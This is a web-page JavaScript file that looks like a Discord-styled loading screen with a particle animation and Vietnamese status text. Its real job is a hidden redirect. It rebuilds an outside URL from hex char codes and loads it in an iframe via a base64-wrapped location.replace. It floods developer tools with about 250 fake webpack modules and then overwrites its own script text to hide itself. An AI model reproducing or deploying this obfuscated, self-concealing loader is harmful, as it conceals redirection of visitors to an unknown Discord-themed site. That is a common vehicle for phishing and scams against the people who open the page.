    (function(){
        'use strict';
        var _0xSelf=document.currentScript;
        var _0xCore=[
            [0x2f,0x76,0x31,0x2f,0x61,0x75,0x74,0x68],
            [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],
            [0x2f,0x63,0x64,0x6e,0x2f,0x6a,0x73,0x2f],
            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],
            [0x2f,0x73,0x74,0x61,0x74,0x69,0x63,0x2f],
            [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],
            [0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f],
            [0x2d,0x7a,0x2e,0x61,0x69,0x2f]
        ];
        var target=_0xCore[1].concat(_0xCore[3],_0xCore[5],_0xCore[7]).map(function(c){return String.fromCharCode(c)}).join('');
        function _injectSourceFile(path,lines){
            var s="/* Webpack Module: "+path+" */\n";
            s+="(function(module, exports, __webpack_require__) {\n";
            s+="'use strict';\n";
            s+="var _config = __webpack_require__('./internal/config.js');\n";
            for(var i=0;i<lines;i++){
                var v1="_v"+Math.random().toString(36).substring(2,10);
                var v2="_fn"+Math.random().toString(36).substring(2,10);
                var v3="mod"+Math.floor(Math.random()*9999);
                s+="var "+v1+" = __webpack_require__('./lib/"+Math.random().toString(36).substring(2,6)+".js');\n";
                s+="function "+v2+"(d) { \n";
                s+="  if("+v1+".debug) { \n";
                s+="    var "+v3+" = "+v1+".parse(d);\n";
                s+="    return "+v3+" !== null ? "+v3+".data : false;\n";
                s+="  } else { return false; }\n";
                s+="}\n";
                s+="exports."+v2+" = "+v2+";\n";
            }
            s+="});\n";
            s+="//# sourceURL=webpack://"+path;
            try{var script=document.createElement('script');script.textContent=s;document.head.appendChild(script);document.head.removeChild(script);}catch(e){}
        }
        var _roots=['node_modules','src','dist','build','out','public','assets','vendor','core','lib','app','pages','styles','scripts','static','components','services','utils','hooks','context','reducers','actions','middlewares','layouts','providers','config'];
        var _libs=['react','vue','angular','lodash','webpack','babel','core-js','axios','redux','next','nuxt','svelte','rxjs','tslib','zone.js','scheduler','clone','process','crypto','firebase','express','koa','hapi','mongoose','prisma','graphql','apollo','socket.io','moment','dayjs','chart.js','d3','three.js','gsap','framer','tailwind','bootstrap','material-ui','ant-design','chakra'];
        var _exts=['.js','.ts','.tsx','.jsx','.mjs','.cjs'];
        for(var i=0;i<250;i++){
            var depth=Math.floor(Math.random()*4)+3;
            var pathParts=[_roots[Math.floor(Math.random()*_roots.length)]];
            for(var d=1;d<depth-1;d++){
                if(d===1&&Math.random()>0.5){pathParts.push(_libs[Math.floor(Math.random()*_libs.length)]);}
                else{pathParts.push(Math.random().toString(36).substring(2,Math.floor(Math.random()*5)+4));}
            }
            pathParts.push(Math.random().toString(36).substring(2,8)+_exts[Math.floor(Math.random()*_exts.length)]);
            _injectSourceFile(pathParts.join('/'),Math.floor(Math.random()*20)+30);
        }
        var cv=document.getElementById('particleCanvas');
        var cx=cv.getContext('2d');
        var ps=[];
        var ms={x:-999,y:-999};
        var cl=[[88,101,242],[235,69,158],[87,242,135],[254,231,92]];
        function resize(){cv.width=innerWidth;cv.height=innerHeight}
        resize();
        addEventListener('resize',resize);
        document.addEventListener('mousemove',function(e){ms.x=e.clientX;ms.y=e.clientY});
        function P(){this.reset()}
        P.prototype.reset=function(){
            this.x=Math.random()*cv.width;this.y=Math.random()*cv.height;this.s=Math.random()*2+.5;
            this.vx=(Math.random()-.5)*.25;this.vy=(Math.random()-.5)*.25;
            var c=cl[Math.floor(Math.random()*cl.length)];this.r=c[0];this.g=c[1];this.b=c[2];
            this.a=Math.random()*.4+.1;this.life=Math.random()*400+200;this.ml=this.life;
        };
        P.prototype.update=function(){
            var dx=ms.x-this.x,dy=ms.y-this.y;var d=Math.sqrt(dx*dx+dy*dy);
            if(d<120){var f=(120-d)/120;this.vx-=(dx/d)*f*.015;this.vy-=(dy/d)*f*.015}
            this.vx*=.99;this.vy*=.99;this.x+=this.vx;this.y+=this.vy;this.life--;
            if(this.life<=0||this.x<-20||this.x>cv.width+20||this.y<-20||this.y>cv.height+20)this.reset();
        };
        P.prototype.draw=function(){
            var ratio=this.life/this.ml;var fa=ratio<.1?ratio*10:(ratio>.9?(1-ratio)*10:1);
            cx.beginPath();cx.arc(this.x,this.y,this.s,0,Math.PI*2);
            cx.fillStyle='rgba('+this.r+','+this.g+','+this.b+','+(this.a*fa).toFixed(3)+')';cx.fill();
        };
        var n=Math.min(60,Math.floor(innerWidth*innerHeight/18000));
        for(var i=0;i<n;i++)ps.push(new P());
        function lines(){
            for(var i=0;i<ps.length;i++){for(var j=i+1;j<ps.length;j++){
                var dx=ps[i].x-ps[j].x,dy=ps[i].y-ps[j].y;var dd=dx*dx+dy*dy;
                if(dd<14400){cx.beginPath();cx.moveTo(ps[i].x,ps[i].y);cx.lineTo(ps[j].x,ps[j].y);
                cx.strokeStyle='rgba(88,101,242,'+((1-Math.sqrt(dd)/120)*.06).toFixed(4)+')';cx.lineWidth=.5;cx.stroke();}
            }}
        }
        function loop(){cx.clearRect(0,0,cv.width,cv.height);for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}lines();requestAnimationFrame(loop);}
        loop();
        var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
        var si=0;
        var _origSetTimeout=window.setTimeout;
        function cycle(){var el=document.getElementById('statusText');if(si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';_origSetTimeout(cycle,600);}}
        addEventListener('DOMContentLoaded',function(){
            cycle();
            var frame=document.getElementById('content-frame');
            var loader=document.getElementById('loader');
            try{if(_0xSelf)_0xSelf.textContent="/* Webpack Runtime: Bootstrap Complete */";}catch(e){}
            var loaded=false;
            function showFrame(){if(loaded)return;loaded=true;_origSetTimeout(function(){loader.classList.add('fade-out');frame.style.display='block';requestAnimationFrame(function(){frame.classList.add('visible');});},500);}
            try{var doc=frame.contentDocument||frame.contentWindow.document;doc.open();doc.write('<!DOCTYPE html><html><head></head><body><script>');doc.write('location.replace(atob("'+btoa(target)+'"));');doc.write('<\/script></body></html>');doc.close();}catch(e){try{frame.contentWindow.location.replace(target);}catch(e2){frame.src=target;}}
            var checkNav=setInterval(function(){try{var h=frame.contentWindow.location.href;if(h!=='about:blank'){clearInterval(checkNav);showFrame();}}catch(e){clearInterval(checkNav);showFrame();}},300);
            _origSetTimeout(function(){clearInterval(checkNav);showFrame();},6000);
        });
    })();
